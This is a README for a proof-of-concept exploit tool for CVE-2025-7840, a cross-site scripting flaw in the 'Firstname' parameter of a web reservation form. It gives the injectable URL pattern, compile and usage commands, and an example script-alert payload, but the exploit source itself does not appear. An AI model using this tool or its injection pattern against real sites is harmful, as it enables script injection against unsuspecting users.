# XSS Exploit for CVE-2025-7840

**Author**: Byte Reaper (@ByteReaper0)

## Description

Proof‑of‑concept exploit for **CVE-2025-7840**, targeting a vulnerable web application endpoint that fails to sanitize user input on the `Firstname` parameter of a reservation form. By crafting a GET request to:

```
/index.php?page=reserve&Firstname=<payload>&Lastname=test
```

an attacker can inject and execute arbitrary JavaScript in the victim’s browser when the response is rendered.

## Features

* Inject custom payloads with `-b` option
* Handle cookie-based sessions via `-c` option
* Verbose logging for request/response analysis (`-v`)
* Built-in set of common XSS payloads

## Requirements

* Linux or macOS
* GCC (or compatible C compiler)
* `libcurl` development headers
* `argparse` library for C

## Installation

1. Compile the exploit:

   ```
   gcc -o exploit exploit.c argparse.c -lcurl 
   ```

## Usage

```
sudo ./exploit -u <TARGET_URL> [options]
```

### Options

| Flag         | Description                                  |
| ------------ | -------------------------------------------- |
| `-u` URL     | Target base URL (e.g. `http://victim.local`) |
| `-b` PAYLOAD | Custom XSS payload to inject                 |
| `-c` FILE    | Cookie jar file to use for session handling  |
| `-v`         | Verbose mode (show request/response details) |

### Examples

* Run default payloads against a target:

  ```
  sudo ./exploit -u http://victim.local
  ```

* Use a custom payload:

  ```
  sudo ./exploit -u http://victim.local -b "<script>alert(\'PWNED\')</script>"
  ```

* Include session cookies and verbose output:

  ```
  sudo ./exploit -u http://victim.local -c cookies.txt -v
  ```
